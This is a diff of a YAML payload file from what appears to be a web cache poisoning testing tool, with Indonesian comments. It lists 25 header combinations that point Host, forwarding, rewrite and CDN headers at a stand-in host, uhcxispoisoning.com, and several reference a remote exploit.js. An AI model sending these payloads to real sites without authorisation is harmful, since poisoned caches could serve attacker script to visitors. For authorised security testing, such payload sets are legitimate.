@@ -1,89 +1,90 @@
+###  config/payloads/multiple.yaml ###
 multiple_header:
-  # Kombinasi umum untuk manipulasi host dan skema
-  - combine_1:
-      Host: "uhcxispoisoning.com"
-      X-Forwarded-Host: "uhcxispoisoning.com"
-  - combine_2:
-      X-Forwarded-Proto: "http"
-      X-Original-URL: "/uhcxispoisoning_path"
-  - combine_3:
-      Referer: "http://uhcxispoisoning.com/"
-      Origin: "https://uhcxploit.com"
+    # Kombinasi umum untuk manipulasi host dan skema
+    - combine_1:
+          Host: "uhcxispoisoning.com"
+          X-Forwarded-Host: "uhcxispoisoning.com"
+    - combine_2:
+          X-Forwarded-Proto: "http"
+          X-Original-URL: "/uhcxispoisoning_path"
+    - combine_3:
+          Referer: "http://uhcxispoisoning.com/"
+          Origin: "https://uhcxploit.com"
 
-  # Kombinasi manipulasi IP dan proxy
-  - combine_4:
-      X-Forwarded-For: "127.0.0.1, uhcxispoisoning.com"
-      X-Real-IP: "uhcxispoisoning.com"
-  - combine_5:
-      True-Client-IP: "uhcxispoisoning.com"
-      Client-IP: "uhcxispoisoning.com"
-  - combine_6:
-      X-Originating-IP: "uhcxispoisoning.com"
-      X-Client-Ip: "uhcxispoisoning.com"
+    # Kombinasi manipulasi IP dan proxy
+    - combine_4:
+          X-Forwarded-For: "127.0.0.1, uhcxispoisoning.com"
+          X-Real-IP: "uhcxispoisoning.com"
+    - combine_5:
+          True-Client-IP: "uhcxispoisoning.com"
+          Client-IP: "uhcxispoisoning.com"
+    - combine_6:
+          X-Originating-IP: "uhcxispoisoning.com"
+          X-Client-Ip: "uhcxispoisoning.com"
 
-  # Kombinasi manipulasi URL/Path internal
-  - combine_7:
-      X-Rewrite-URL: "/uhcxispoisoning_path"
-      X-HTTP-DestinationURL: "http://uhcxispoisoning.com/exploit.js"
-  - combine_8:
-      Request-URI: "/uhcxispoisoning-uri"
-      Orig_Path_Info: "/uhcxispoisoning-pathinfo"
-  - combine_9:
-      X-Forwarded-Uri: "/uhcxispoisoning_uri"
-      X-Request-URI: "/uhcxispoisoning_request_uri"
+    # Kombinasi manipulasi URL/Path internal
+    - combine_7:
+          X-Rewrite-URL: "/uhcxispoisoning_path"
+          X-HTTP-DestinationURL: "http://uhcxispoisoning.com/exploit.js"
+    - combine_8:
+          Request-URI: "/uhcxispoisoning-uri"
+          Orig_Path_Info: "/uhcxispoisoning-pathinfo"
+    - combine_9:
+          X-Forwarded-Uri: "/uhcxispoisoning_uri"
+          X-Request-URI: "/uhcxispoisoning_request_uri"
 
-  # Kombinasi dengan header yang mempengaruhi caching atau proxy behavior
-  - combine_10:
-      User-Agent: "Mozilla/5.0 (CachePoisoner; rv:1.0)"
-      Cookie: "sessionid=uhcxispoisoningcookie"
-  - combine_11:
-      Accept-Encoding: "gzip, deflate, br"
-      Vary: "*" # Jika server memproses Vary tapi tidak di-cache dengan benar
-  - combine_12:
-      X-Wap-Profile: "http://uhcxispoisoning.com/wap.xml"
-      Proxy-Host: "uhcxispoisoning.com"
-  - combine_13:
-      CF-Visitor: '{"scheme":"http"}'
-      X-Scheme: "http" # Mencoba downgrade skema
-  - combine_14:
-      Upgrade-Insecure-Requests: "1"
-      X-Forwarded-Ssl: "on" # Kontradiktif, mencoba memicu logika aneh
-  - combine_15:
-      X-Cache-Status: "HIT" # Memaksa server berpikir cache hit
-      X-Served-By: "uhcxispoisoning_server"
+    # Kombinasi dengan header yang mempengaruhi caching atau proxy behavior
+    - combine_10:
+          User-Agent: "Mozilla/5.0 (CachePoisoner; rv:1.0)"
+          Cookie: "sessionid=uhcxispoisoningcookie"
+    - combine_11:
+          Accept-Encoding: "gzip, deflate, br"
+          Vary: "*" # Jika server memproses Vary tapi tidak di-cache dengan benar
+    - combine_12:
+          X-Wap-Profile: "http://uhcxispoisoning.com/wap.xml"
+          Proxy-Host: "uhcxispoisoning.com"
+    - combine_13:
+          CF-Visitor: '{"scheme":"http"}'
+          X-Scheme: "http" # Mencoba downgrade skema
+    - combine_14:
+          Upgrade-Insecure-Requests: "1"
+          X-Forwarded-Ssl: "on" # Kontradiktif, mencoba memicu logika aneh
+    - combine_15:
+          X-Cache-Status: "HIT" # Memaksa server berpikir cache hit
+          X-Served-By: "uhcxispoisoning_server"
 
-  # Kombinasi dengan header Cloudflare/CDN spesifik
-  - combine_16:
-      CF-Connecting-IP: "uhcxispoisoning.com"
-      CloudFront-Forwarded-Proto: "http"
-  - combine_17:
-      X-Amz-Cf-Id: "uhcxispoisoning_cf_id"
-      CloudFront-Viewer-Country: "RU"
-  - combine_18:
-      X-Azure-IP: "uhcxispoisoning.com"
-      X-CDN-Cache: "BYPASS" # Mencoba bypass cache di layer CDN
+    # Kombinasi dengan header Cloudflare/CDN spesifik
+    - combine_16:
+          CF-Connecting-IP: "uhcxispoisoning.com"
+          CloudFront-Forwarded-Proto: "http"
+    - combine_17:
+          X-Amz-Cf-Id: "uhcxispoisoning_cf_id"
+          CloudFront-Viewer-Country: "RU"
+    - combine_18:
+          X-Azure-IP: "uhcxispoisoning.com"
+          X-CDN-Cache: "BYPASS" # Mencoba bypass cache di layer CDN
 
-  # Kombinasi untuk memaksa perilaku server/proxy
-  - combine_19:
-      X-Proxy-Host: "uhcxispoisoning.com"
-      X-Proxy-Url: "http://uhcxispoisoning.com/proxied"
-  - combine_20:
-      X-Original-Host: "uhcxispoisoning.com"
-      X-Path-Override: "/uhcxispoisoning_path_override"
-  - combine_21:
-      X-Rewrite-Engine: "On"
-      X-Accel-Redirect: "/uhcxispoisoning_redirect"
-  - combine_22:
-      Location: "http://uhcxispoisoning.com/redirect_here" # Jika server memproses ini dalam request
-      Refresh: "0;url=http://uhcxispoisoning.com/refresh"
+    # Kombinasi untuk memaksa perilaku server/proxy
+    - combine_19:
+          X-Proxy-Host: "uhcxispoisoning.com"
+          X-Proxy-Url: "http://uhcxispoisoning.com/proxied"
+    - combine_20:
+          X-Original-Host: "uhcxispoisoning.com"
+          X-Path-Override: "/uhcxispoisoning_path_override"
+    - combine_21:
+          X-Rewrite-Engine: "On"
+          X-Accel-Redirect: "/uhcxispoisoning_redirect"
+    - combine_22:
+          Location: "http://uhcxispoisoning.com/redirect_here" # Jika server memproses ini dalam request
+          Refresh: "0;url=http://uhcxispoisoning.com/refresh"
 
-  # Kombinasi lanjutan dengan header "Original" untuk menipu proxy/cache
-  - combine_23:
-      X-Original-X-Forwarded-Host: "uhcxispoisoning.com"
-      X-Original-X-Forwarded-Proto: "http"
-  - combine_24:
-      X-Original-Host: "uhcxispoisoning.com"
-      X-Original-Referer: "http://uhcxispoisoning.com/original"
-  - combine_25:
-      X-Original-Request-URI: "/uhcxispoisoning_request_uri"
-      X-Original-X-HTTP-DestinationURL: "http://uhcxispoisoning.com/exploit.js"
+    # Kombinasi lanjutan dengan header "Original" untuk menipu proxy/cache
+    - combine_23:
+          X-Original-X-Forwarded-Host: "uhcxispoisoning.com"
+          X-Original-X-Forwarded-Proto: "http"
+    - combine_24:
+          X-Original-Host: "uhcxispoisoning.com"
+          X-Original-Referer: "http://uhcxispoisoning.com/original"
+    - combine_25:
+          X-Original-Request-URI: "/uhcxispoisoning_request_uri"
+          X-Original-X-HTTP-DestinationURL: "http://uhcxispoisoning.com/exploit.js"
